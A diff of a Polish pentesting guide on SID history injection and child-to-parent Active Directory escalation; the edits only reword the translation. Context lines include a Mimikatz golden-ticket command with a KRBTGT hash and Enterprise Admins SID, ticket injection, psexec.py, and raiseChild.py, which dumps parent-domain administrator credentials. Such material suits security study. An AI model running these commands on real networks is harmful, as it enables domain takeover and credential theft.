@@ -8,7 +8,7 @@ Celem **ataku wstrzykiwania historii SID** jest wspieranie **migracji użytkowni
 
 Istnieją dwie metody wykonania tego ataku: poprzez stworzenie **Złotego Biletu** lub **Diamentowego Biletu**.
 
-Aby zidentyfikować SID dla grupy **"Enterprise Admins"**, należy najpierw zlokalizować SID domeny głównej. Po zidentyfikowaniu, SID grupy Enterprise Admins można skonstruować, dodając `-519` do SID domeny głównej. Na przykład, jeśli SID domeny głównej to `S-1-5-21-280534878-1496970234-700767426`, to wynikowy SID dla grupy "Enterprise Admins" będzie `S-1-5-21-280534878-1496970234-700767426-519`.
+Aby zidentyfikować SID dla grupy **"Enterprise Admins"**, należy najpierw zlokalizować SID domeny głównej. Po identyfikacji, SID grupy Enterprise Admins można skonstruować, dodając `-519` do SID domeny głównej. Na przykład, jeśli SID domeny głównej to `S-1-5-21-280534878-1496970234-700767426`, to wynikowy SID dla grupy "Enterprise Admins" będzie `S-1-5-21-280534878-1496970234-700767426-519`.
 
 Można również użyć grupy **Domain Admins**, której SID kończy się na **512**.
 
@@ -59,7 +59,7 @@ diamond-ticket.md
 .\kirbikator.exe lsa .\CIFS.mcorpdc.moneycorp.local.kirbi
 ls \\mcorp-dc.moneycorp.local\c$
 ```
-Zwiększ uprawnienia do DA roota lub administratora przedsiębiorstwa, używając hasha KRBTGT skompromitowanej domeny:
+Zwiększ uprawnienia do DA roota lub administratora Enterprise, używając hasha KRBTGT skompromitowanej domeny:
 ```bash
 Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-211874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'
 
@@ -99,7 +99,7 @@ export KRB5CCNAME=hacker.ccache
 # psexec in domain controller of root
 psexec.py <child_domain>/Administrator@dc.root.local -k -no-pass -target-ip 10.10.10.10
 ```
-#### Automatycznie za pomocą [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)
+#### Automatycznie przy użyciu [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)
 
 To jest skrypt Impacket, który **automatyzuje eskalację z domeny podrzędnej do nadrzędnej**. Skrypt wymaga:
 
@@ -108,12 +108,12 @@ To jest skrypt Impacket, który **automatyzuje eskalację z domeny podrzędnej d
 
 Przebieg jest następujący:
 
-- Uzyskuje SID grupy Enterprise Admins w domenie nadrzędnej
-- Pobiera hash konta KRBTGT w domenie podrzędnej
+- Uzyskuje SID dla grupy Enterprise Admins w domenie nadrzędnej
+- Pobiera hash dla konta KRBTGT w domenie podrzędnej
 - Tworzy Złoty Bilet
 - Loguje się do domeny nadrzędnej
-- Pobiera poświadczenia dla konta Administratora w domenie nadrzędnej
-- Jeśli określono przełącznik `target-exec`, uwierzytelnia się do kontrolera domeny domeny nadrzędnej za pomocą Psexec.
+- Pobiera poświadczenia dla konta Administrator w domenie nadrzędnej
+- Jeśli określono przełącznik `target-exec`, uwierzytelnia się do kontrolera domeny nadrzędnej za pomocą Psexec.
 ```bash
 raiseChild.py -target-exec 10.10.10.10 <child_domain>/username
 ```
